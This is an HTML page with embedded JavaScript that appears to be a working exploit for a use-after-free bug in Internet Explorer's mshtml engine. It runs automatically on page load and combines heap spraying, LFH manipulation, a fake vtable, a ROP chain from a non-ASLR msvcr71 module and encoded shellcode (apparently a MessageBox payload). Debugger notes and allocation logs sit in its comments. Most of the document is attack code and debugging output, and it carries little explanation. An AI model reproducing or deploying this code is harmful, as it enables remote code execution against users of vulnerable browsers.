<!DOCTYPE html>
<HTML XMLNS:t ="urn:schemas-microsoft-com:time">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
<meta>
  <?IMPORT namespace="t" implementation="#default#time2">
</meta>
<s>a205qiCDccqshJxNETEjZqiZ4</s>
<script language='javascript'>
/*
Notes:
1. Give up on BSTR as allocator unless one can be found in Corelan folder. Verified it ALWAYS pads up to alloc(0x30)
2. Despite having an alloc(0x28) the buttons being created with button allocator do NOT contain the string data.
3. Double verified button allocator 0x28 size is the CButton itself: changing string length has no affect.
4. ANIMATE element is proving difficult due to innerHTML quirks. 
5. Managed to prove that using document.body.innerHTML for the wipe in the PoC code works fine. 
6. Attempting to restore innerHTML post-wipe always causes now bugs: old controllable crash condition is gone (even with DIV UAF re-claim).
7. innerHTML must be left in a wiped state after exploit triggers UAF

*/

/*
Finally found alloc in a sea of other alloc for ANIMATECURSOR.

0:004> dd 0x039f6770
039f6770  039f7388 00528dc8 00529170 00529050
039f6780  00528e28 00528e70 00528e88 00528f00
039f6790  00528ee8 00528ed0 39bd97a5 80000009
039f67a0  731c019a 00000000 72e47be0 039f7bc0
039f67b0  72ea8700 00000000 00000000 00000000
039f67c0  02000064 72ea8570 39bd97af 8000002e
039f67d0  731c0182 00000000 72e65d74 03a0a5c8
039f67e0  72e497d0 00000000 00000000 00000000

Ptr at offset 0 goes to the payload (no BSTR len etc.)


*/

function funcresize() {
   try { document.body.attachEvent('onselectstart',funcselectstart); } catch (err) {}
   try { var o_event = document.createEventObject(); } catch (err) {}
   try { document.body.fireEvent('onselectstart',o_event); } catch (err) {}
}

var LFHArrayLen = 1000;
var LFHArray = new Array(LFHArrayLen);
var UafReClaimCount = 3000;
var UafReClaimArray = new Array(UafReClaimCount);

/*

.logclose
.logopen C:\\alloc.txt
bp jscript!JsCos "be 1000;be 1001;be 1002; g"
bp jscript!JsSin "bd 1000;bd 1001;bd 1002; g"
bp jscript!JsAtan2 ".printf \"%mu\", poi(poi(poi(esp+14)+8)+8);.echo;g"
bp jscript!JsAtan ".echo HALT"
bp1000 !ntdll + 0002e10c ".printf \"alloc(0x%x) = 0x%p from %p\", poi(esp+c), eax, poi(esp); .echo; g"
bp1001 ntdll!RtlFreeHeap "j (poi(esp+c)!=0) '.printf \"free(0x%p), size=0x%x from (%p)\", poi(esp+c), 0x1000 - poi(esp+c) & 0xFFF, poi(esp); .echo; g'; 'g';"
bd 1000
bd 1001
bp1002 !mshtml + 1F05FE "g"
bd 1002
*/

var SprayCount = 400; // This is enough to consistently hit 0x0AEB0000
var SprayArray = new Array(SprayCount); // CollectGarbage will free heap sprayed chunks if this is not global.

function Exploit() {
	FakeCButtonObj = CreateUafObject(DwordArrayToBytes([0x0AEB0024]), 0x28); // This object does NOT have a BSTR length field, despite being constructed as a "string" internally
	FakeCButtonObj = FakeCButtonObj.substr(0);
	var TestData = CreateUafObject(DwordArrayToBytes([0x0]), 0x800);
	//Math.atan2(0,'--- starting LFH spray');
	//Math.cos(0); // Start logging
	ActivateLFH(FakeCButtonObj);
	//Math.sin(0); // End logging
	//Math.atan2(0,'--- ending LFH spray');
	//alert("alloc sizes and content?");
	var Payload = CreateFakeVtable();
	HeapSpray(Payload, 0, SprayCount);
	
    try { var oRange29 = document.body.createTextRange();} catch (err) {}
    /*LFHArray = new Array(); // Create sink hole gaps in the heap for chunks of target 0x28 size allocated as a side-effect of the allocator itself
	CollectGarbage();
	ActivateLFH(FakeCButtonObj);*/
    try { oRange29.select(); } catch (err) {}
	
}

function funcselect() {
   try { document.execCommand('InsertInputPassword',true,'img-74993_250'); } catch (err) {}
}

function funcselectstart(ev) {
	   try { ev.srcElement.innerHTML = '';/*"<t:ANIMATECOLOR id=\"myanim\"/>;"*/ } catch (err) {}
	   
		//LFHArray = new Array(); // Create sink hole gaps in the heap for chunks of target 0x28 size allocated as a side-effect of the allocator itself
		//CollectGarbage();
		Math.atan2(0,'------------ final re-claim spray');
		//Math.cos(0);
		//ActivateLFH(FakeCButtonObj);
		
		
		// Release the UAF region again
		LFHArray = new Array(); // Create sink hole gaps in the heap for chunks of target 0x28 size allocated as a side-effect of the allocator itself
		CollectGarbage();
		UafReClaim(FakeCButtonObj);
		Math.atan2(0,'------------ re-claim spray finished');
		//Math.sin(0);
}

/*

From the very start of the log:

alloc(0x18) = 0x025a77f8 from 76ce9d45
free(0x025a77f8), size=0x808 from (76ce98cd)
alloc(0x30) = 0x06673f50 from 750bea43 - BSTR length 0x26: includes 0x0c0c0c0c padding.
alloc(0x2c) = 0x06673b60 from 72c9abee - BSTR length 0x26: includes 0x0c0c0c0c padding. Temp var (freed)
alloc(0x14) = 0x06414550 from 72e654fd
alloc(0x28) = 0x069477d0 from 72e6614e
alloc(0x40) = 0x06d04aa8 from 72e4d7d0
free(0x06673b60), size=0x4a0 from (74ed14dd)
alloc(0x50) = 0x043b1ed0 from 72e50d56
free(0x043b1ed0), size=0x130 from (74ed14dd)
alloc(0x28) = 0x069429d0 from 72e4d5bd
alloc(0x28) = 0x06948370 from 72dc0a58
alloc(0xc8) = 0x02666e10 from 76ce9d45
alloc(0x10) = 0x0691d1a8 from 750bea43
free(0x02666e10), size=0x1f0 from (76ce98cd)
alloc(0x18) = 0x025a77f8 from 76ce9d45
alloc(0x30) = 0x06673b60 from 750bea43
free(0x025a77f8), size=0x808 from (76ce98cd)
alloc(0x30) = 0x06675028 from 750bea43
alloc(0x2c) = 0x066724d8 from 72c9abee
alloc(0x14) = 0x06414510 from 72e654fd
alloc(0x28) = 0x069413e0 from 72e6614e
alloc(0x40) = 0x06d03a10 from 72e4d7d0
free(0x066724d8), size=0xb28 from (74ed14dd)



alloc(0x30) = 0x066730e0 from 750bea43 - BSTR length 0x26: includes 0x0c0c0c0c padding.
alloc(0x2c) = 0x06674810 from 72c9abee - BSTR length 0x26: includes 0x0c0c0c0c padding.
alloc(0x14) = 0x04319700 from 72e654fd - Object
alloc(0x28) = 0x063e93b8 from 72e6614e - The gold allocation (perfect size, no BSTR length). Does not get freed.
alloc(0x40) = 0x0689e678 from 72e4d7d0
free(0x06674810), size=0x7f0 from (74ed14dd)
alloc(0x50) = 0x06dc0b10 from 72e50d56
free(0x06dc0b10), size=0x4f0 from (74ed14dd)
alloc(0x28) = 0x063e8de8 from 72e4d5bd - Object (DIV-related, never freed)
alloc(0x28) = 0x063e72e8 from 72dc0a58 - Object (DIV-related, never freed)
alloc(0xc8) = 0x02666d40 from 76ce9d45
alloc(0x10) = 0x06550930 from 750bea43
free(0x02666d40), size=0x2c0 from (76ce98cd)
alloc(0x18) = 0x025a77f8 from 76ce9d45
alloc(0x30) = 0x06674810 from 750bea43
free(0x025a77f8), size=0x808 from (76ce98cd)
alloc(0x30) = 0x06672eb0 from 750bea43
alloc(0x2c) = 0x06674650 from 72c9abee
alloc(0x14) = 0x043196a0 from 72e654fd
alloc(0x28) = 0x063ea438 from 72e6614e
alloc(0x40) = 0x0689e630 from 72e4d7d0
free(0x06674650), size=0x9b0 from (74ed14dd)
alloc(0x50) = 0x06dc0b10 from 72e50d56
free(0x06dc0b10), size=0x4f0 from (74ed14dd)
alloc(0x28) = 0x063e8d88 from 72e4d5bd
alloc(0x28) = 0x063e68f8 from 72dc0a58
alloc(0xc8) = 0x02666d40 from 76ce9d45
alloc(0x10) = 0x06551620 from 750bea43
free(0x02666d40), size=0x2c0 from (76ce98cd)

0:008> dd 0x066730e0
066730e0  00000026 0aeb0024 00990099 00990099
066730f0  00990099 00990099 00990099 00990099
06673100  00990099 0c0c0099 00000c0c 00000000
06673110  1a08c35c 88000000 00000026 0aeb0024
06673120  00990099 00990099 00990099 00990099
06673130  00990099 00990099 00990099 0c0c0099
06673140  00000c0c 03c90510 1a08c357 8c000000
06673150  72e57df4 00008000 00000000 00000009
0:008> dd 0x06674810
06674810  00000026 0aeb0024 00990099 00990099
06674820  00990099 00990099 00990099 00990099
06674830  00990099 0c0c0099 00000c0c 00000000
06674840  1a08cc76 8c000000 00740068 00700074
06674850  003a0073 002f002f 00770077 002e0077
06674860  00690062 0067006e 0063002e 006d006f
06674870  0000002f 00000000 1a08cc71 8a000000
06674880  00740068 00700074 003a0073 00770077
0:008> dd 0x04319700
04319700  72c9a594 00000004 00000004 0689e678
04319710  00040fa4 00000000 1a37546d 8c000000
04319720  72c9a594 00000004 00000004 0689e6c0
04319730  00040fa4 00000000 1a375469 8c000000
04319740  72c9a594 00000004 00000004 0689e4c8
04319750  00040fa4 00000000 1a375465 8c000000
04319760  72c9a594 00000004 00000004 0689e480
04319770  00040fa4 00000000 1a375461 8c000000
0:008> dd 0x063e93b8
063e93b8  0aeb0024 00990099 00990099 00990099
063e93c8  00990099 00990099 00990099 00990099
063e93d8  0c0c0099 00000c0c 1a03ca82 88000000
063e93e8  72dc0a90 00000001 00000008 04319700
063e93f8  025bcee0 00000000 8000001f 00010000
063e9408  00000100 06418ff0 1a03ca7c 88000000
063e9418  0aeb0024 00990099 00990099 00990099
063e9428  00990099 00990099 00990099 00990099
0:008> dd 0x0689e678
0689e678  00001f00 800103e9 00000000 063e93b8
0689e688  00000000 00000000 00000000 00000000
0689e698  00000000 00000000 00000000 00000000
0689e6a8  00000000 00000000 00000000 00000000
0689e6b8  1a151989 88000000 00001f00 800103e9
0689e6c8  00000000 063e9418 00000000 00000000
0689e6d8  00000000 00000000 00000000 00000000
0689e6e8  00000000 00000000 00000000 00000000

The size 0x28 re-claim chunk is never freed, and with its chunk header gets a
total chunk size of 0x30:

0:008> !heap -x 0x063e93b8
Entry     User      Heap      Segment       Size  PrevSize  Unused    Flags
-----------------------------------------------------------------------------
063e93b0  063e93b8  005f0000  04457920        30      -            8  LFH;busy 

The primary sizes being created by the allocator are: 0x18, 0x30, 0x2c, 0x14,
0x28 and 0x40. There should be no collisions with a total chunk size of 0x30.
*/

function UafReClaim(Data) {
	for (var i = 0; i < UafReClaimCount; i++){
		UafReClaimArray[i] = document.createElement('div');
		var Temp = Data + unescape("%u7777%u7777");
		Math.atan2(0,'------------ DIV className BSTR alloc ');
		Math.cos(0);
		UafReClaimArray[i].className = Temp.substr(0);
		Math.atan2(0,'------------ DIV className BSTR ended ');
		Math.sin(0);
		
	}
}

// msfvenom -p generic/custom -e x86/alpha_mixed BufferRegister=ESP BufferOffset=4 -a x86 --platform Windows -c MessageBox32.bin -o shellcode-encoded.bin PAYLOADFILE=NothingShellcode32.bin
var Shellcode = unescape("%u5954%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u5137%u6a5a%u5841%u3050%u3041%u6b41%u4141%u3251%u4241%u4232%u3042%u4242%u4241%u5058%u4138%u7542%u494a%u7061%u6c79%u506c%u6858%u6f4d%u5035%u5065%u7077%u3075%u496c%u7569%u3130%u5248%u5443%u4b4c%u3276%u7064%u4b6c%u4251%u4c54%u4b4c%u5250%u3452%u6b6e%u4263%u4876%u504c%u4f74%u576e%u6a62%u4636%u5176%u6f79%u504c%u6145%u304f%u4c6e%u704e%u6c75%u7161%u6c61%u5265%u6c64%u7065%u5159%u6f5a%u4d74%u3133%u5779%u306a%u6278%u6e58%u307a%u6b78%u5175%u6363%u6243%u4751%u706e%u6b4e%u6233%u7036%u4b6c%u4230%u6c35%u7167%u706a%u504c%u6b4e%u3057%u7870%u6b48%u7177%u5272%u454c%u306f%u6f36%u646e%u6b30%u5035%u3033%u5055%u6146%u5078%u3076%u304a%u4b4c%u3867%u7856%u4b6c%u6863%u7065%u6136%u5348%u306a%u536b%u4b51%u6962%u4b4c%u3430%u4b6c%u5145%u767a%u504c%u3130%u6f49%u7134%u5069%u4c4e%u704e%u616a%u6f4a%u4d54%u7177%u4748%u3870%u7039%u3574%u7378%u6b58%u5445%u6f36%u3051%u4466%u4d32%u7357%u4d63%u7868%u6b45%u6d51%u5457%u4553%u5a78%u706e%u7872%u706e%u6b6e%u3856%u7455%u304a%u6b68%u6546%u6c4e%u4a6c%u5253%u4258%u4c75%u6166%u5378%u706e%u5643%u6b4e%u6c76%u6b52%u4b7a%u7847%u516f%u6174%u6a73%u5059%u6344%u7462%u6f79%u3238%u4b4c%u4861%u6c67%u3133%u5338%u4b6c%u3463%u4b6c%u5135%u5058%u304a%u794f%u6432%u5457%u5447%u6b63%u6b43%u3165%u6953%u6a33%u7132%u307a%u6f59%u304d%u6853%u6f43%u5a70%u504c%u6b6e%u3262%u495a%u3056%u6f49%u4f4b%u6f59%u4d71%u304a%u6e4d%u5245%u3043%u5045%u7077%u5a43%u7043%u704e%u7871%u7057%u5034%u5035%u7067%u3636%u706e%u7a71%u5035%u304a%u5843%u4871%u446e%u7372%u455a%u4f6b%u5578%u305a%u696e%u5379%u494c%u674a%u494c%u516a%u484a%u4e30%u3033%u7067%u5065%u6e43%u6b48%u3343%u3956%u6564%u6f67%u7258%u644c%u304a%u584b%u5947%u5075%u7067%u7057%u6b58%u5875%u5245%u365a%u6d38%u3262%u6c49%u6b55%u5a4c%u4c6c%u4b6f%u7049%u4d35%u4a56%u7a37%u4872%u3639%u756e%u6d4d%u6d6f%u6f79%u756a%u6c45%u6646%u6c51%u7a57%u306b%u6b69%u7049%u4543%u7537%u6b6d%u3737%u3352%u3254%u4f32%u5a53%u3033%u5350%u4f6b%u5558%u5146%u5059%u7052%u5070%u5070%u5350%u7042%u3056%u4842%u6865%u3865%u6d66%u3652%u6f59%u356e%u5870%u6843%u5133%u7979%u3743%u3063%u7067%u5035%u586b%u4d6e%u6f79%u6f69%u6f69%u304a%u5369%u3536%u794f%u6578%u4862%u484c%u6e52%u6d76%u7047%u487a%u5370%u3043%u7067%u5065%u6850%u766f%u6773%u6d36%u7047%u5050%u6848%u546c%u5075%u5035%u5035%u7851%u3370%u3230%u7067%u3033%u3845%u7532%u3344%u4572%u3274%u6463%u4f4b%u5078%u6870%u4a55%u3838%u4634%u3033%u7062%u484a%u6c31%u7077%u5065%u3063%u6a70%u6450%u7831%u3034%u3734%u4e52%u4532%u494c%u6178%u6870%u6e70%u4542%u6431%u5065%u3845%u6f70%u6251%u3244%u4e46%u5873%u4542%u7330%u7430%u6d74%u5853%u5643%u4f42%u4233%u6231%u7831%u3744%u7750%u4743%u6e64%u496c%u324d%u6a50%u3073%u6243%u5150%u4a72%u7067%u6f79%u706a%u696e%u4c5a%u6d33%u634a%u7532%u394b%u454a%u7762%u6673%u4e4f%u7044%u7037%u5075%u7067%u3475%u4d6e%u6b4e%u5051%u4c44%u4b4c%u4833%u5854%u396b%u6e69%u5136%u5079%u4b6a%u6476%u4977%u6749%u6451%u7865%u456c%u6679%u3444%u3451%u6d4e%u6e53%u3471%u556d%u6b6b%u4433%u5444%u6b4e%u6b62%u3453%u454c%u396f%u7470%u4d64%u5a63%u3143%u7132%u7869%u4d31%u7157%u3033%u5075%u6b35%u5561%u7877%u5472%u5675%u7164%u5049%u4b6c%u5656%u6b68%u5758%u6b6e%u7643%u3052%u6e33%u4f61%u494c%u6c58%u4d51%u724b%u4454%u7057%u4561%u796f%u554b%u314b%u4c5a%u7044%u5235%u7037%u5075%u4b4c%u6532%u5835%u394b%u4550%u6839%u4b6c%u7562%u7838%u3373%u4270%u4c47%u734f%u5059%u6476%u594d%u4570%u306c%u334b%u304f%u6447%u694e%u6562%u544a%u696e%u4248%u4b6c%u3537%u6876%u4344%u6252%u3055%u6b6e%u7a33%u3455%u796f%u6d32%u304e%u496c%u6542%u6c79%u696e%u326f%u6b6e%u6532%u4854%u3363%u7263%u7075%u496c%u7573%u4c4a%u4b4c%u7542%u6c39%u6b6e%u5551%u4874%u3333%u7233%u5477%u396b%u6542%u7469%u4b4c%u5550%u6c59%u4b4c%u5571%u6876%u4354%u3267%u6c37%u394b%u5561%u487a%u6145%u5069%u596d%u7563%u506b%u594d%u6552%u4839%u6b6e%u3557%u6c59%u6b4e%u7073%u5844%u4b57%u3537%u504b%u4f34%u466c%u727a%u3053%u7067%u5035%u6b6e%u7543%u7069%u4d6c%u4c74%u456c%u5045%u5045%u3053%u7067%u4b6c%u3556%u4c4a%u6b6e%u7553%u7877%u3353%u7467%u6147%u696e%u7543%u4449%u6a70%u7037%u7042%u386d%u6d4d%u5055%u3063%u5075%u4b67%u7573%u4c44%u6f76%u554d%u716d%u5055%u3073%u7067%u4b6c%u6542%u7049%u6d6e%u3462%u5075%u6b4e%u6542%u445a%u6f46%u3778%u7437%u3253%u6d4e%u4c34%u654e%u5055%u3033%u3033%u3053%u4b6c%u5530%u6868%u6b6e%u3537%u4854%u6376%u3453%u6147%u494c%u7563%u5838%u4b6c%u6d52%u6c69%u394b%u4a68%u6336%u4571%u5058%u3970%u784b%u6c31%u4f43%u6965%u5078%u4d53%u4b73%u5769%u3557%u4859%u3033%u7047%u3063%u5035%u6165%u5959%u6d4e%u6d6f%u704a%u4d6b%u6f79%u4f6b%u6a4e%u7456%u7867%u504d%u7a48%u5065%u5462%u5077%u304b%u6a39%u4e36%u5562%u6567%u376f%u5355%u4e56%u5443%u6c50%u4c72%u634e%u4358%u6466%u4648%u4374%u5065%u6d4e%u4d6d%u707a%u6e59%u6f39%u6f69%u5131%u4b6a%u6e6b%u686e%u3362%u7163%u5371%u4b6a%u784a%u5679%u6336%u7077%u4d4c%u6d6f%u706a%u6d49%u6f79%u6f39%u7a31%u7037%u5350%u6868%u4c47%u3063%u7047%u7037%u3066%u7879%u3349%u4e4b%u6f59%u4f4b%u754f%u706b%u6471%u6974%u694e%u5551%u4c69%u7a51%u7037%u4d4c%u654f%u705a%u6e69%u6f69%u6f59%u7232%u486a%u6164%u5055%u7037%u3073%u3046%u4f6b%u7570%u6c6b%u486a%u316e%u4e6b%u4f4b%u6f69%u394b%u7533%u686b%u4b5a%u6a36%u4d4c%u3577%u7079%u6f69%u7057%u7969%u6f77%u4f4b%u6f39%u6f39%u4b4c%u7553%u4879%u394b%u6c78%u6d53%u625a%u7857%u3073%u7552%u396b%u7539%u4751%u6b6e%u4d70%u7847%u4b6c%u4d73%u6c56%u6145%u4b69%u304b%u7934%u3043%u5472%u4435%u4f54%u566e%u7177%u6c56%u3075%u4f74%u3678%u706a%u3173%u4379%u616b%u7379%u3137%u756f%u6f59%u3454%u6a38%u6172%u6b58%u574b%u696e%u786a%u6f43%u594d%u4c5a%u4d31%u326f%u6876%u5055%u4141");

function HeapSpray(Content, StartOffset, RegionCount) { // Spray the data specified in Content in 0x10000 chunks within 1MB allocated regions. The starting offset of the content in the 1MB chunks may be 0, or any multiple of 2.
    var PrePadding = unescape("%u1111");
    var TailPadding = unescape("%u2222");
    var Data;
    
    if(StartOffset > 0) {
        Data = PrePadding;
        
        for(var i = 0; i < ((StartOffset / 2) - 1); i++) { // -1 for var init
            Data += PrePadding;
        }
        
        Data += Content
    }
    else {
        Data = Content;
    }
    
    // These are chunks of 0x10000 bytes, then x 16 for 1MB. 0x10000 is the ideal size for heap spray as it ensures consistency, while 1MB is not (they will not always begin at a consistent 1MB multiple). 1MB chunks have a 0x20 header size, others have 0x8. 0x10000 will end up as sub-chunks within the 1MB allocations with no headers. This ensures that any multiple of 0x10000 ie. 0x11a00000, 0x11b00000, etc. will always be hit, and the payload will be at offset 0x24 within them (to accomodate 1MB header size of 0x20 + 4 byte BSTR length).
    
    while (TailPadding.length < (65536/2)) { // This is a fast way of making a large chunk
      TailPadding = TailPadding + TailPadding
    }
    
    Data = Data + TailPadding;
    
    // 65536 * 16 = 1048576 (1MB). Exclude 38 (0x26) bytes for heap chunk header (0x20 bytes), BSTR length (0x4 bytes), null terminator (0x2 bytes).
    
    var SprayChunk = Data.substr(0, 65536/2);
    
    for(var i = 0; i < 14; i++) {
        SprayChunk += Data.substr(0, 65536/2);
    }
    
    SprayChunk += Data.substr(0, (65536/2) - (38/2));
    
    for(var i = 0; i < RegionCount; i++) {
      SprayArray[i] = SprayChunk.substr(0, SprayChunk.length);
    }
}

function ActivateLFH(Data) {
	/*
	CPhraseElement is using a factory method not a constructor. Size is 0x28
	
	0:005> uf mshtml!CPhraseElement::CreateElement
	mshtml!CPhraseElement::CreateElement:
	71d0fe0e 8bff            mov     edi,edi
	71d0fe10 55              push    ebp
	71d0fe11 8bec            mov     ebp,esp
	71d0fe13 56              push    esi
	71d0fe14 57              push    edi
	71d0fe15 6a28            push    28h
	71d0fe17 6a08            push    8
	71d0fe19 ff3518840a72    push    dword ptr [mshtml!g_hProcessHeap (720a8418)]
	71d0fe1f 33ff            xor     edi,edi
	71d0fe21 ff150013b771    call    dword ptr [mshtml!_imp__HeapAlloc (71b71300)]
	71d0fe27 8bf0            mov     esi,eax
	71d0fe29 85f6            test    esi,esi
	71d0fe2b 742d            je      mshtml!CPhraseElement::CreateElement+0x39 (71d0fe5a)
	*/
	
	for (var i = 0; i < LFHArrayLen; i++){
		LFHArray[i] = document.createElement('div');
		var Temp = Data + unescape("%u7777%u7777");
		LFHArray[i].className = Temp.substr(0);
	}
}

function DwordArrayToBytes(DwordArray) {
	var ByteArray = [];
	
	for (var i = 0; i < DwordArray.length; i++) {
		ByteArray.push(DwordArray[i] & 0xffff);
		ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
	}
	
	return String.fromCharCode.apply(null, ByteArray);
}

/*


BSTR length does NOT include the NULL terminator or length field itself.
*/

function CreateUafObject(VtableAddressBytes, Size) {
	var ObjectArray = [];
	
	for (var i = 0; ObjectArray.length < (((Size - 6) / 2) - VtableAddressBytes.length); i++) { // -4 for the BSTR length and -2 for NULL terminator
		ObjectArray[i] = 0x99;
	}
	
	var FinalObject = VtableAddressBytes + String.fromCharCode.apply(null, ObjectArray);
	return FinalObject;//.substr(0, FinalObject.length);
}

function BuildRopNopSled(RopNopAddressBytes, Size) {
	var Obj = "";
	
	while (Obj.length < (Size / 2)) {
		Obj += RopNopAddressBytes;
	}
	
	return Obj;
}

function CreateFakeVtable() {
	/*
	eax=00990099 ebx=00000000 ecx=00000c0c edx=00000000 esi=06497bb0 edi=06497bb0
	eip=72e8008a esp=02bb9e10 ebp=02bb9e78 iopl=0         nv up ei ng nz na pe nc
	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
	mshtml!CElement::GetMarkupPtr+0x11:
	72e8008a 8b01            mov     eax,dword ptr [ecx]  ds:002b:00000c0c=????????
	0:005> uf mshtml!CElement::GetMarkupPtr
	Flow analysis was incomplete, some code may be missing
	mshtml!CElement::GetMarkupPtr:
	72e47d9d 8b411c          mov     eax,dword ptr [ecx+1Ch]
	72e47da0 84c0            test    al,al
	72e47da2 0f88df820300    js      mshtml!CElement::GetMarkupPtr+0xe (72e80087)

	mshtml!CElement::GetMarkupPtr+0x7:
	72e47da8 a900010000      test    eax,100h
	72e47dad 0f85d4820300    jne     mshtml!CElement::GetMarkupPtr+0xe (72e80087)

	mshtml!CElement::GetMarkupPtr+0x18:
	72e47db3 a900020000      test    eax,200h
	72e47db8 0f84f6430500    je      mshtml!CElement::GetMarkupPtr+0x23 (72e9c1b4)

	mshtml!CElement::GetMarkupPtr+0x1f:
	72e47dbe 8b4124          mov     eax,dword ptr [ecx+24h]
	72e47dc1 c3              ret

	mshtml!CElement::GetMarkupPtr+0xe:
	72e80087 8b4924          mov     ecx,dword ptr [ecx+24h] <- ECX = re-claimed CPhraseElement
	72e8008a 8b01            mov     eax,dword ptr [ecx]     <- Attempts to de-reference vftable. Offset 0x24 can only contain 2 valuable bytes: the final 2 must be the NULL terminator. Thus a BSTR allocator cannot be used for re-claim.
	72e8008c 8b5020          mov     edx,dword ptr [eax+20h]
	72e8008f ffe2            jmp     edx

	mshtml!CElement::GetMarkupPtr+0x23:
	72e9c1b4 33c0            xor     eax,eax
	72e9c1b6 c3              ret
	
	ECX = CPhraseElement
	*/
	var FakeVtable = BuildRopNopSled(DwordArrayToBytes([0x7C348B06]), (0x10 - 4)); // mov     ecx,dword ptr [ecx+10h]; JMP ECX
	FakeVtable += DwordArrayToBytes([0x7C364C66]); // POP EBP ; RET  gadget to hop over stack pivot at 0xDC after ROPNOP sled from 0x0AEB0024 up to 0x0AEB0100 (+0xDC from start of fake vtable)
	FakeVtable += DwordArrayToBytes([0x7C348B05]); // XCHG EAX, ESP ; RET
	var Msvcr71RopChain = unescape("%u4c66%u7c36%u4c66%u7c36%u4edc%u7c34%ucfff%uffff%u1e05%u7c35%u36e3%u7c35%uffff%uffff%u5255%u7c34%u218e%u7c35%u5937%u7c34%uffc0%uffff%u1eb1%u7c35%uc5b9%u7c36%u1e67%u7c39%u2e58%u7c34%ud202%u7c34%uf8f4%u7c34%u15a2%u7c34%u4edc%u7c34%ua151%u7c37%u8c81%u7c37%u5c30%u7c34");
	FakeVtable += Msvcr71RopChain; // Non-ASLR module from Java v6.45
	FakeVtable += Shellcode;
	return FakeVtable;
	//<t:ANIMATECOLOR id="myanim"/>
}

</script>
</head>
<body onresize=eval(funcresize()) onload=eval(Exploit()) onselect=eval(funcselect()) >
<t:ANIMATECOLOR id="myanim"/>
</body>
</html>